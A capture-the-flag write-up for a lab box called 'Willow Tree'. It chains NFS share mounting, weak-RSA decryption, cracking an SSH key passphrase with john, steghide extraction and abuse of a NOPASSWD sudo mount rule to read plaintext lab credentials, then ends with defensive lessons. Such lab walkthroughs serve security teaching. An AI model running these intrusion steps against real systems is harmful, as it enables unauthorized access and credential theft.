# Willow Tree — CTF Writeup

A box that chains **NFS misconfiguration → weak RSA key recovery → SSH key cracking → steganography → sudo privilege escalation**. Below is the full path I took from initial recon to root.

---

## 🔍 Recon

Started with a basic service scan against the target:

```bash
nmap -sV 10.48.178.179
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22   | ssh     | OpenSSH 6.7p1 Debian 5 |
| 80   | http    | Apache httpd 2.4.10 (Debian) |
| 111  | rpcbind | 2-4 (RPC #100000) |
| 2049 | nfs     | 2-4 (RPC #100003) |

The open `111`/`2049` combo immediately flagged **NFS** as worth checking, and port `80` was worth a look too.

---

## 🌐 Web Enumeration

Visiting the site's `index.html` didn't return a normal web page — instead it dumped a huge blob of **raw hex-encoded text**.

I saved this hex blob (`hex.txt`) for later — turns out it's ciphertext that needs to be decrypted with an RSA key I hadn't found yet.

---

## 📂 NFS Enumeration & Mounting

Since NFS was open, I checked for exported shares:

```bash
showmount -e 10.49.147.149
```

```
Export list for 10.49.147.149:
/var/failsafe *
```

The `*` means anyone can mount it — classic NFS misconfig. Mounted it locally:

```bash
sudo mkdir /mnt/fail
sudo mount 10.49.147.149:/var/failsafe /mnt/fail
ls -la /mnt/fail
```

Found a single interesting file: `rsa_keys`.

---

## 🔑 Breaking the Weak RSA Key

```bash
cat rsa_keys
```

```
Public Key Pair:  (23, 37627)
Private Key Pair: (61527, 37627)
```

This is a textbook **RSA key pair with a small modulus** (`n = 37627`), meaning `n` can be trivially factored and the private exponent is already handed to us. Using a small custom decryption script (`fail.py`) I decrypted the hex blob pulled from the web server earlier using the recovered private key:

```bash
python3 fail.py hex.txt 61527 37627 > rsakey
```

The output (`rsakey`) turned out to be a full **RSA private SSH key** in PEM format:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,...
...
-----END RSA PRIVATE KEY-----
```

It's passphrase-protected (`ENCRYPTED`), so the key alone wasn't enough yet.

---

## 🔓 Cracking the SSH Key Passphrase

Converted the key into a crackable hash format and threw `rockyou.txt` at it:

```bash
ssh2john rsakey > key.txt
john --wordlist=/usr/share/wordlists/rockyou.txt key.txt
```

**Cracked in seconds:**

```
wildflower       (rsakey)
```

Fixed permissions on the key so SSH would accept it:

```bash
chmod 600 rsakey
```

---

## 📥 Pulling Files via SCP

With a valid private key + passphrase, I grabbed a file from the `willow` user's home directory:

```bash
scp -i rsakey -o PubkeyAcceptedKeyTypes=+ssh-rsa willow@10.49.153.55:user.jpg .
```

(passphrase: `wildflower`)

---

## 🖼️ Flag #1 — Hidden in Plain Sight

Opening `user.jpg` with ImageMagick's `display` revealed text baked directly into the image:

```
THM{beneath_the_weeping_willow_tree}
```

✅ **User flag found.**

---

## 🕵️ Flag #2 — Steganography

The image looked "too clean" for just a text overlay, so I checked it for hidden data using `steghide`:

```bash
steghide extract -sf user.jpg
```

Entered the same passphrase (`wildflower`) and it extracted a hidden file:

```bash
cat root.txt
```

```
THM{find_a_red_rose_on_the_grave}
```

✅ **A second flag, hidden inside the image itself via steganography.**

---

## 🔐 SSH Access & Privilege Escalation

Logged into the box properly as `willow` using the cracked key, then checked sudo rights:

```bash
sudo -l
```

```
User willow may run the following commands on willow-tree:
    (ALL : ALL) NOPASSWD: /bin/mount /dev/*
```

`willow` can mount **any device** in `/dev` as root, without a password — a huge red flag for privilege escalation.

Looking through `/dev`, I spotted a suspicious, non-standard device:

```bash
cd /dev
ls
```

`hidden_backup` stood out immediately.

### Exploiting the mount permission

```bash
sudo /bin/mount /dev/hidden_backup /mnt/creds
cd /mnt/creds
cat creds.txt
```

```
root:7QvbvBTvwPspUK
willow:U0ZZJLGYhNAT2s
```

Cracked/plundered credentials for both `root` and `willow` straight off a hidden backup partition mounted via an over-permissive sudo rule.

---

## 🏁 Root

Using the recovered password, I escalated to `root` and grabbed the final flag file:

```bash
cat root.txt
```

```
This would be too easy, don't you think? I actually gave you the
root flag some time ago. You've got my password now -- go find your flag!
```

A nice troll ending — the **real root flag** (`THM{find_a_red_rose_on_the_grave}`) had already been obtained earlier via `steghide` on `user.jpg`. Root access confirmed the story, but the flag itself was hidden well before I ever got a shell.

---

## 🚩 Flags Recovered

| Flag | Value |
|------|-------|
| User | `THM{beneath_the_weeping_willow_tree}` |
| Root  | `THM{find_a_red_rose_on_the_grave}` |

---

## 🧠 Summary / Lessons Learned

- **NFS shares with `*` export permissions** are an easy win for attackers — always restrict to specific hosts.
- **Small RSA moduli are trivially breakable.** `n = 37627` factors instantly; production keys need 2048+ bit moduli.
- **Encrypted SSH keys are only as strong as their passphrase** — `wildflower` fell to `rockyou.txt` in seconds. Use long, unique passphrases.
- **Steganography can hide flags/data inside images that look completely normal** — always check binary/media files with tools like `steghide`, `binwalk`, or `exiftool` during CTFs.
- **Overly broad `sudo` rules** (like `NOPASSWD: /bin/mount /dev/*`) can be abused to mount arbitrary devices and access data that should be protected — least privilege matters, even for "convenience" sudo rules.

---

## 🛠️ Tools Used

- `nmap`
- `showmount` / `mount` (NFS)
- Custom Python RSA decryption script
- `ssh2john` + `john` (John the Ripper)
- `scp`
- `ImageMagick` (`display`)
- `steghide`
- `sudo` privilege escalation via device mounting
